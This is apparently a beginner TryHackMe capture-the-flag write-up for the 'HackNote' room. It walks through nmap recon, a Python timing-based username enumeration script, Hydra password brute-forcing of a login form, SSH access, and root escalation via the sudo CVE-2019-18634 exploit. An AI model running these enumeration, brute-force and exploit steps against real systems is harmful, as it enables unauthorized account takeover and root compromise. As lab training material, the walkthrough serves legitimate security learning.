# HackNote – TryHackMe Writeup

**Room:** HackNote  
**Difficulty:** Beginner  
**Topics:** Reconnaissance, Username Enumeration, Custom Wordlists, Hydra, SSH, Linux Privilege Escalation

## Introduction

This room introduces several practical cybersecurity concepts:

- Network reconnaissance
- Username enumeration through response timing
- Custom password wordlist generation
- Password testing with Hydra
- SSH access
- Linux privilege escalation using a known Sudo vulnerability

> All commands and techniques in this writeup are intended for the authorized TryHackMe lab environment.

---

## Task 1: Reconnaissance

First, identify open ports and running services on the target machine.

### Nmap Scan

```bash
nmap -sV TARGET_IP
```

**Explanation:**
- `-sV` – Detects service versions.
- `TARGET_IP` – Target machine IP address.

The scan helps identify the available services and their versions.

---

## Task 2: Web Investigation

Open the target IP address in a browser and investigate the web application.

During the investigation, we discover:

- A login page
- A user registration page
- A developer-related page

First, create an account and log in.

### Username Enumeration

Try the following login attempts:

1. Enter an invalid username with an incorrect password.
2. Enter your registered username with an incorrect password.

Observe the response time for both requests.

A timing difference may indicate whether a username exists in the application.

This technique is known as **Username Enumeration through Timing Analysis**.

---

## Task 3: Username Enumeration

After investigating the application's HTTP headers, requests, and responses, we identify a possible timing-based username enumeration vulnerability.

We use Python and the `requests` library to measure login response times.

### Step 1: Install Required Tools

```bash
sudo apt update
sudo apt install seclists python3-requests -y
```

### Step 2: Locate Username Wordlists

```bash
find /usr/share/seclists/Usernames/Honeypot-Captures/ -type f
```

This command searches for available username wordlists.

### Step 3: Create a Working Directory

```bash
mkdir ~/hackernote
cd ~/hackernote
```

### Step 4: Create the Python Script

```bash
nano timing_attack.py
```

### Step 5: Python Script

```python
import requests
import time
import statistics

URL = "http://TARGET_IP/api/user/login"


def do_login(username):
    data = {
        "username": username,
        "password": "invalidPassword!"
    }

    start = time.perf_counter()

    try:
        requests.post(
            URL,
            json=data,
            timeout=10
        )
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None

    end = time.perf_counter()

    return (end - start) * 1000


def main():
    wordlist = input("Wordlist path: ")

    with open(wordlist, "r", errors="ignore") as file:
        usernames = [
            line.strip()
            for line in file
            if line.strip()
        ]

    valid = []

    for username in usernames:
        times = []

        for _ in range(3):
            result = do_login(username)

            if result is not None:
                times.append(result)

        if not times:
            continue

        median = statistics.median(times)

        print(f"{username}: {median:.2f} ms")

        if median > 1000:
            valid.append(username)

    print("\nPossible valid usernames:")

    for username in valid:
        print(username)

    print(f"\nTotal: {len(valid)}")


if __name__ == "__main__":
    main()
```

**Important:**
- Replace `TARGET_IP` with the actual lab IP.
- `time.perf_counter()` measures request duration.
- `statistics.median()` calculates the median response time.
- The `1000 ms` threshold is specific to the observed lab behaviour. It should not be treated as a universal indicator of a valid username.

### Step 6: Execute the Script

```bash
python3 timing_attack.py
```

Enter the username wordlist path when prompted.

After analysing the response times, we identify a possible valid username.

---

## Task 4: Password Wordlist Generation

After identifying the username, the next step is to construct a custom password wordlist.

The room provides a ZIP file:

`wordlists_1581610609109.zip`

### Step 1: Extract the ZIP File

```bash
unzip wordlists_1581610609109.zip
```

The archive contains two files:

- `colors.txt`
- `numbers.txt`

### Step 2: Create a Python Script

```bash
nano combine.py
```

### Step 3: Combine Both Wordlists

```python
with open("colors.txt") as colors:
    color_list = colors.read().splitlines()

with open("numbers.txt") as numbers:
    number_list = numbers.read().splitlines()

with open("wordlist.txt", "w") as output:
    for color in color_list:
        for number in number_list:
            output.write(color + number + "\n")
```

This script combines every color with every number and saves the results in `wordlist.txt`.

### Step 4: Execute the Script

```bash
python3 combine.py
```

Now we have a custom password wordlist.

---

## Task 5: Password Testing with Hydra

We use Hydra to test the generated password list against the lab's login endpoint.

```bash
hydra -l james -P ~/Downloads/wordlist.txt TARGET_IP http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password" -t 1 -V
```

**Important options:**

| Option | Purpose |
|---|---|
| `-l` | Specifies a single username |
| `-P` | Specifies a password wordlist |
| `-t 1` | Uses one task at a time |
| `-V` | Displays each login attempt |
| `^USER^` | Username placeholder |
| `^PASS^` | Password placeholder |

The failure message must match the application's actual response. The request format and failure condition should be verified using the browser's developer tools or Burp Suite.

After identifying the correct credentials, use them to log in to the application and obtain SSH access.

### SSH Login

```bash
ssh james@TARGET_IP
```

After successful login:

```bash
whoami
```

Navigate to the user's home directory and read the user flag:

```bash
cd ~
ls -la
cat user.txt
```

---

## Task 6: Linux Privilege Escalation

After gaining SSH access, we have a normal user account.

Our next objective is to investigate possible privilege escalation vulnerabilities.

### Step 1: Check Sudo Permissions

```bash
sudo -l
```

During the investigation, we notice unusual password feedback behaviour when entering the sudo password.

This behaviour is associated with the Sudo `pwfeedback` option.

**Important:** Seeing password feedback alone does not prove that the system is vulnerable to CVE-2019-18634. The Sudo version, configuration, and vulnerability conditions must also be checked.

### Step 2: Research the Vulnerability

We investigate:

`CVE-2019-18634`

This vulnerability is associated with a buffer overflow in Sudo when the `pwfeedback` option is enabled under vulnerable conditions.

### Step 3: Download the Exploit on Kali Linux

```bash
cd ~/Downloads

git clone https://github.com/saleemrashid/sudo-cve-2019-18634.git
```

### Step 4: Compile the Exploit

```bash
cd sudo-cve-2019-18634

make
```

Check the generated files:

```bash
ls -l
```

### Step 5: Transfer the Binary to the Target

```bash
scp exploit james@TARGET_IP:/home/james/
```

This transfers the compiled exploit binary to the target user's home directory.

### Step 6: Run the Exploit

Follow the execution instructions provided in the exploit repository and run it only in the authorized lab environment.

### Step 7: Verify Privilege Level

```bash
whoami
```

If privilege escalation succeeds, the output should indicate root access.

### Step 8: Read the Root Flag

```bash
cd /root

ls -la

cat root.txt
```

---

## Key Learning Outcomes

| Topic | What I Learned |
|---|---|
| Nmap | Service and version detection |
| Web Investigation | Analysing login pages and HTTP requests |
| Username Enumeration | Identifying usernames through response timing |
| Python | Measuring response times and generating custom wordlists |
| Hydra | Testing passwords against an HTTP login form |
| SSH | Connecting to a remote Linux machine |
| Sudo | Checking user privileges |
| CVE-2019-18634 | Understanding a Sudo privilege escalation vulnerability |
| SCP | Transferring files between systems |

## References

- [TryHackMe](https://tryhackme.com/)
- [Nmap Documentation](https://nmap.org/book/man.html)
- [Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [SecLists GitHub](https://github.com/danielmiessler/SecLists)
- [CVE-2019-18634](https://nvd.nist.gov/vuln/detail/CVE-2019-18634)
- [Sudo CVE-2019-18634 Exploit Repository](https://github.com/saleemrashid/sudo-cve-2019-18634)

---

**Disclaimer:** This writeup documents learning activities in an authorized cybersecurity lab. Never perform vulnerability testing or password attacks against systems without permission.
